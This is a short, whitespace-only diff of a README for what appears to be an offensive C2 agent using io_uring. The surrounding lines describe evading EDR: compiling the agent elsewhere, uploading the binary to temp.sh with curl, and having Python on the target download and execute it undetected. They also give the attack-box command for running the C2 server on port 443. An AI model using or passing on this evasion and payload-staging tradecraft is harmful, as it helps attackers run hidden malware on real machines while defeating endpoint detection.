@@ -36,9 +36,9 @@ Even functions that still rely on older syscalls (such as directory reading) rem
 
 ## Requirements
 
-- Linux kernel 5.1 or higher  
-- `liburing` library  
-- A compatible C compiler (tested with GCC)  
+- Linux kernel 5.1 or higher
+- `liburing` library
+- A compatible C compiler (tested with GCC)
 
 ## Env
 
@@ -58,10 +58,10 @@ gcc agent.c -o agent -luring -O2 -s -static
 
 In testing, I noticed that EDR detected the compilation of `agent.c` by monitoring GCC usage in real time (it's better not to use wget/curl). To bypass this, I compiled the agent statically on my machine, sent the finished binary via `temp.sh` and used Python on the target to download and execute it. This technique worked without warning.
 
-Server (Attack box) : 
+Server (Attack box) :
 
 - `curl -F "file=agent" https://temp.sh/upload`
-- `python3 server.py --ip IP --port 443` 
+- `python3 server.py --ip IP --port 443`
 
 Agent (Target machine) :
 
